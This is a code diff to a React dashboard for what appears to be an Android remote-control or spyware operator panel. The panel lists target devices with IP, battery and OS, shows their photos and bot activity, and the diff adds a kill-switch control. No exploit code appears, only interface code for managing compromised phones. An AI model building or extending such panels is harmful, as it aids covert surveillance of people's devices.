@@ -4,8 +4,10 @@ import { useEffect, useMemo, useState } from 'react';
 import TargetList from '@/components/TargetList';
 import PhotoGallery from '@/components/PhotoGallery';
 import ActivityLog from '@/components/ActivityLog';
+import { KillSwitch } from '@/components/dashboard/KillSwitch';
 import { subscribeToTargets, sendCommand } from '@/services/targetService';
 import { Target } from '@/types/target';
+import { Device } from '@/types';
 
 export default function DashboardPage() {
   const [targets, setTargets] = useState<Target[]>([]);
@@ -49,16 +51,37 @@ export default function DashboardPage() {
 
   const offlineCount = useMemo(() => targets.length - onlineCount, [targets.length, onlineCount]);
 
+  // Convert Target to Device type for KillSwitch
+  const devicesForKillSwitch = useMemo(() => {
+    return targets.map(t => ({
+      id: t.id,
+      model: t.deviceInfo?.model || 'Unknown',
+      status: (t.status?.toLowerCase() || 'offline') as any,
+      battery: t.battery || 0,
+      android_version: t.deviceInfo?.os || 'N/A',
+      ip_address: t.ip || '0.0.0.0',
+      last_ping: t.last_ping || 0
+    })) as Device[];
+  }, [targets]);
+
   return (
     <main className="min-h-screen bg-slate-950 px-4 py-6 text-white">
       <div className="mx-auto max-w-[1480px] space-y-6">
         <section className="rounded-[32px] border border-white/10 bg-slate-950/90 p-6 shadow-2xl shadow-slate-950/40 backdrop-blur-xl">
-          <p className="text-sm uppercase tracking-[0.3em] text-emerald-300/80">Keigame Admin</p>
-          <h1 className="mt-3 text-4xl font-semibold text-white">Military-Grade Command Center</h1>
-          <p className="mt-3 max-w-2xl text-sm text-slate-400">
-            Monitor perangkat target Android secara real-time, lihat status dan foto terkini, serta pantau aktivitas bot di satu dashboard.
-          </p>
-          <div className="mt-6 grid gap-4 sm:grid-cols-3">
+          <div className="flex flex-col md:flex-row justify-between items-start gap-6">
+            <div>
+              <p className="text-sm uppercase tracking-[0.3em] text-emerald-300/80">Keigame Admin</p>
+              <h1 className="mt-3 text-4xl font-semibold text-white">Military-Grade Command Center</h1>
+              <p className="mt-3 max-w-2xl text-sm text-slate-400">
+                Monitor perangkat target Android secara real-time, lihat status dan foto terkini, serta pantau aktivitas bot di satu dashboard.
+              </p>
+            </div>
+            <div className="w-full md:w-auto">
+              <KillSwitch devices={devicesForKillSwitch} />
+            </div>
+          </div>
+
+          <div className="mt-8 grid gap-4 sm:grid-cols-3">
             <div className="rounded-3xl border border-white/10 bg-white/5 p-5 shadow-inner shadow-slate-950/20">
               <p className="text-sm uppercase tracking-[0.2em] text-slate-400">Total Targets</p>
               <p className="mt-3 text-3xl font-semibold text-white">{targets.length}</p>
